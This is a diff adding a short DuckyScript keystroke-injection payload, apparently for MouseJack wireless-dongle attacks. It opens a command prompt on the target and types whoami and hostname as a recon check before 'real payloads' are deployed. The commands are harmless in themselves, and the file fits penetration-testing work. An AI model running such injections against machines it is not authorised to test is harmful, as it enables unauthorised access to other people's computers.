@@ -1,0 +1,15 @@
+REM DuckyScript: benign recon payload for injection testing
+REM Opens Run dialog, launches cmd, runs whoami
+REM Use to verify MouseJack injection is working before deploying real payloads
+
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+STRING whoami
+ENTER
+DELAY 500
+STRING hostname
+ENTER
+DELAY 200
